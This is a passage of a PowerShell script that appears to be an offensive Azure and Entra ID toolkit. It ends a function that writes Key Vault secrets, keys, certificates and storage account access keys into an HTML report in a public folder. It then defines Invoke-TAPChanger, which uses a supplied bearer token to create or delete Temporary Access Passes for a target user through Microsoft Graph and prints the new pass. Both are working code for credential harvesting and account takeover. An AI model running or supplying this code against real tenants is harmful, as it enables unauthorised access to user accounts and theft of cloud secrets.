    $certsCell = if ($certs.Count -gt 0) { $certs -join "<br>" } else { "<span class='badge bg-secondary'>No Certificates</span>" }

    "<tr>
        <td>$subName</td>
        <td>$rgName</td>
        <td>$kvName</td>
        <td>$secretsCell</td>
        <td>$keysCell</td>
        <td>$certsCell</td>
    </tr>"
}) -join "`n"

$htmlKV += @"
        </tbody>
    </table>
</div>
"@

# -- Storage Accounts Table
$htmlSA = @"
<div class="tab-pane fade" id="sa" role="tabpanel" aria-labelledby="sa-tab">
    <table id="saTable" class="table table-striped table-bordered nowrap" style="width:100%">
        <thead><tr>
            <th>Subscription Name</th>
            <th>Resource Group</th>
            <th>Resource Name</th>
            <th>Key1</th>
            <th>Key2</th>
        </tr></thead>
        <tbody>
"@

$htmlSA += ($StorageAccounts | ForEach-Object {
    "<tr>
        <td>$($_.SubscriptionName)</td>
        <td>$($_.ResourceGroup)</td>
        <td>$($_.ResourceName)</td>
        <td style='word-break: break-word;'>$($_.Key1)</td>
        <td style='word-break: break-word;'>$($_.Key2)</td>
    </tr>"
}) -join "`n"

$htmlSA += @"
        </tbody>
    </table>
</div>
"@

# -- Virtual Machines Table
$htmlVM = @"
<div class="tab-pane fade" id="vm" role="tabpanel" aria-labelledby="vm-tab">
    <table id="vmTable" class="table table-striped table-bordered nowrap" style="width:100%">
        <thead><tr>
            <th>Subscription Name</th>
            <th>Resource Group</th>
            <th>Resource Name</th>
        </tr></thead>
        <tbody>
"@

$htmlVM += ($VirtualMachines | ForEach-Object {
    "<tr>
        <td>$($_.SubscriptionName)</td>
        <td>$($_.ResourceGroup)</td>
        <td>$($_.ResourceName)</td>
    </tr>"
}) -join "`n"

$htmlVM += @"
        </tbody>
    </table>
</div>
"@

$htmlFooter = @"
    </div> <!-- End tab-content -->

</div> <!-- End container -->

<script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://cdn.datatables.net/1.13.4/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/1.13.4/js/dataTables.bootstrap5.min.js"></script>

<script>
`$(document).ready(function() {
    $('#kvTable').DataTable({ scrollX: true });
    $('#saTable').DataTable({ scrollX: true });
    $('#vmTable').DataTable({ scrollX: true });
});
</script>

</body>
</html>
"@

# ----------------------------------------------------------------

$htmlContent = $htmlHeader + $htmlKV + $htmlSA + $htmlVM + $htmlFooter

$htmlFilePath = "C:\Users\Public\Invoke-ResourcePermissions-Report.html"
$htmlContent | Set-Content -Path $htmlFilePath -Encoding UTF8

Write-Host "`n[+] Report saved to $htmlFilePath" -ForegroundColor Green

}
else {
    Write-Host "`n[-] No interesting resources found. No report generated." -ForegroundColor Yellow
}


}


<################################################################################################################################################>

function Invoke-TAPChanger {
    param(
        [Parameter(Mandatory)]
        [string]$UseTargetID,
        [Parameter(Mandatory)]
        [string]$AccessToken,
        [switch]$Add,
        [switch]$Delete,
        [int]$LifetimeMinutes = 60,
        [bool]$IsUsableOnce = $false,
        [datetime]$StartDateTime
    )

    function New-TemporaryAccessPass {
        param(
            [string]$UserId,
            [string]$Token,
            [int]$Minutes,
            [bool]$UsableOnce,
            [datetime]$Start
        )

        $url = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/temporaryAccessPassMethods"

        $body = @{
            lifetimeInMinutes = $Minutes
            isUsableOnce      = $UsableOnce
        }

        if ($Start) {
            $body.startDateTime = $Start.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
        }

        $headers = @{
            Authorization = "Bearer $Token"
            "Content-Type" = "application/json"
        }

        try {
            $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body ($body | ConvertTo-Json -Depth 10)
            Write-Host "[+] TAP Created Successfully" -ForegroundColor Green
            Write-Host "    TemporaryAccessPass : $($response.temporaryAccessPass)"
            Write-Host "    StartDateTime       : $($response.startDateTime)"
        } catch {
            Write-Error "[-] Failed to create TAP: $_"
        }
    }

    function Remove-TemporaryAccessPass {
        param(
            [string]$UserId,
            [string]$Token
        )

        $baseUrl = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/temporaryAccessPassMethods"
        $headers = @{
            Authorization = "Bearer $Token"
            "Content-Type" = "application/json"
        }

        try {
            $methods = Invoke-RestMethod -Uri $baseUrl -Method Get -Headers $headers
            foreach ($method in $methods.value) {
                $deleteUrl = "$baseUrl/$($method.id)"
                Invoke-RestMethod -Uri $deleteUrl -Method Delete -Headers $headers
                Write-Host "[+] TAP Deleted: $($method.id)" -ForegroundColor Yellow
            }
        } catch {
            Write-Error "[-] Failed to delete TAP(s): $_"
        }
    }

    if ($Add) {
        if ($PSBoundParameters.ContainsKey('StartDateTime')) {
			New-TemporaryAccessPass -UserId $UseTargetID -Token $AccessToken -Minutes $LifetimeMinutes -UsableOnce $IsUsableOnce -Start $StartDateTime
		} else {
			New-TemporaryAccessPass -UserId $UseTargetID -Token $AccessToken -Minutes $LifetimeMinutes -UsableOnce $IsUsableOnce
		}

    }

    if ($Delete) {
        Remove-TemporaryAccessPass -UserId $UseTargetID -Token $AccessToken
    }
}


 
